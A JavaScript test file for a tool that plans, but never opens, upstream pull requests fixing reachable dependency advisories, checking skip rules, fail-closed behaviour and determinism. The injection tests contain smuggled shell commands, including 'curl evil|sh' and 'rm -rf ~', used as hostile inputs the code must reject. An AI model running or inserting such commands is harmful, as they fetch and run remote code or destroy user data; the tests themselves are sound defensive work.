// remediation-pr decides ONE question deterministically: does a reachable dependency advisory
// warrant a PREPARED (never opened) upstream PR? The case that motivates the whole file is
// gitleaks GO-2025-3922 — reachable in the shipped release, already fixed on master — which MUST
// be skipped, not proposed. These tests pin that, the fail-closed direction, and determinism.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

import { planRemediationPR, planBatch, branchFor, renderPRBody, fieldsSafe, isSlug } from '../remediation-pr.mjs';

const MODULE = join(dirname(fileURLToPath(import.meta.url)), '..', 'remediation-pr.mjs');

// The trufflehog-shaped advisory: reachable, patched floor known, still live upstream.
const liveAdv = {
  id: 'GO-2026-6061', package: 'google.golang.org/grpc', ecosystem: 'Go',
  currentVersion: '1.79.3', fixed: '1.82.1', reachable: true,
  bump: { module: 'google.golang.org/grpc', from: '1.79.3', to: '1.83.2' },
  upstream: { repo: 'trufflesecurity/trufflehog', defaultBranch: 'main' },
};

// The gitleaks-shaped advisory: reachable in the release, ALREADY fixed on master.
const alreadyFixedAdv = {
  id: 'GO-2025-3922', package: 'github.com/ulikunitz/xz', ecosystem: 'Go',
  currentVersion: '0.5.12', fixed: '0.5.15', reachable: true,
  bump: { module: 'github.com/mholt/archives', from: '0.1.2', to: '0.1.5' },
  upstream: { repo: 'gitleaks/gitleaks', defaultBranch: 'master' },
};

test('reachable + still live upstream -> propose, with a branch and a body', () => {
  const p = planRemediationPR(liveAdv, { headState: { fixed: false } });
  assert.equal(p.action, 'propose');
  assert.equal(p.branch, 'deps/go-2026-6061');
  assert.match(p.title, /grpc/);
  assert.match(p.body, /go get google\.golang\.org\/grpc@1\.83\.2/);
});

test('THE gitleaks case: upstream already fixed -> skip, never propose', () => {
  const p = planRemediationPR(alreadyFixedAdv, { headState: { fixed: true } });
  assert.equal(p.action, 'skip');
  assert.equal(p.reason, 'upstream-already-fixed');
  assert.ok(!p.body, 'a skipped advisory carries no PR body');
});

test('upstream state unverifiable -> undetermined, fail closed (no propose on a guess)', () => {
  for (const headState of [undefined, {}, { fixed: null }]) {
    const p = planRemediationPR(liveAdv, { headState });
    assert.equal(p.action, 'undetermined', `headState=${JSON.stringify(headState)}`);
    assert.equal(p.reason, 'upstream-state-unverified');
  }
});

test('undetermined reachability is never promoted to a proposed fix', () => {
  const p = planRemediationPR({ ...liveAdv, reachable: 'undetermined' }, { headState: { fixed: false } });
  assert.equal(p.action, 'skip');
  assert.equal(p.reason, 'reachability-undetermined');
});

test('not reachable -> skip', () => {
  const p = planRemediationPR({ ...liveAdv, reachable: false }, { headState: { fixed: false } });
  assert.equal(p.action, 'skip');
  assert.equal(p.reason, 'not-reachable');
});

test('reachable but no fix target -> skip, cannot bump to an unknown version', () => {
  const p = planRemediationPR({ ...liveAdv, fixed: '', bump: null }, { headState: { fixed: false } });
  assert.equal(p.action, 'skip');
  assert.equal(p.reason, 'no-fix-target');
});

test('a command-injection slug fails closed: skip, never a prepared command', () => {
  const evil = { ...liveAdv, upstream: { repo: 'foo/bar && curl evil|sh', defaultBranch: 'main' } };
  const p = planRemediationPR(evil, { headState: { fixed: false } });
  assert.equal(p.action, 'skip');
  assert.equal(p.reason, 'unsafe-fields');
  assert.ok(!p.commands, 'no command list is emitted for an unsafe advisory');
});

test('an injection-shaped bump module/version fails closed', () => {
  for (const bump of [{ module: 'a/b; rm -rf ~', to: '1.2.3' }, { module: 'a/b', to: '1.0 && evil' }]) {
    const p = planRemediationPR({ ...liveAdv, bump }, { headState: { fixed: false } });
    assert.equal(p.action, 'skip', JSON.stringify(bump));
    assert.equal(p.reason, 'unsafe-fields');
  }
});

test('fieldsSafe/isSlug accept canonical, reject metachars', () => {
  assert.ok(isSlug('trufflesecurity/trufflehog'));
  assert.ok(!isSlug('foo/bar && x'));
  assert.ok(!isSlug('foo'));
  assert.ok(!isSlug('/bar'));
  assert.ok(fieldsSafe(liveAdv));
});

test('an open upstream PR / dependabot branch -> skip in-flight, no duplicate', () => {
  const p = planRemediationPR(liveAdv, { headState: { fixed: false, inFlight: true } });
  assert.equal(p.action, 'skip');
  assert.equal(p.reason, 'upstream-pr-in-flight');
});

test('the probed upstream SHA is recorded on a proposal', () => {
  const p = planRemediationPR(liveAdv, { headState: { fixed: false, sha: 'abc123' } });
  assert.equal(p.action, 'propose');
  assert.equal(p.probedSha, 'abc123');
});

test('branch names are deterministic and shell-safe', () => {
  assert.equal(branchFor({ id: 'GHSA-abc/DEF 123' }), 'deps/ghsa-abc-def-123');
  assert.equal(branchFor({}), 'deps/advisory');
});

test('body is byte-identical across renders (determinism)', () => {
  assert.equal(renderPRBody(liveAdv, { spec: 'x@1' }), renderPRBody(liveAdv, { spec: 'x@1' }));
});

test('planBatch partitions and preserves order', () => {
  const b = planBatch([liveAdv, alreadyFixedAdv], { 'GO-2026-6061': { fixed: false }, 'GO-2025-3922': { fixed: true } });
  assert.equal(b.counts.proposed, 1);
  assert.equal(b.counts.skipped, 1);
  assert.equal(b.proposed[0].id, 'GO-2026-6061');
  assert.equal(b.skipped[0].id, 'GO-2025-3922');
});

test('CLI is declare-only: writes a plan, states it was not applied, opens no PR', () => {
  const dir = mkdtempSync(join(tmpdir(), 'rem-'));
  const inPath = join(dir, 'in.json');
  writeFileSync(inPath, JSON.stringify({
    advisories: [liveAdv, alreadyFixedAdv],
    headStates: { 'GO-2026-6061': { fixed: false }, 'GO-2025-3922': { fixed: true } },
  }));
  const r = spawnSync(process.execPath, [MODULE, inPath], { encoding: 'utf8' });
  assert.equal(r.status, 0);
  const out = JSON.parse(r.stdout);
  assert.match(out.note, /PREPARED, NOT APPLIED/);
  assert.equal(out.plan.counts.proposed, 1);
  assert.equal(out.plan.counts.skipped, 1);
  // determinism: a second run is byte-identical
  const r2 = spawnSync(process.execPath, [MODULE, inPath], { encoding: 'utf8' });
  assert.equal(r.stdout, r2.stdout);
});
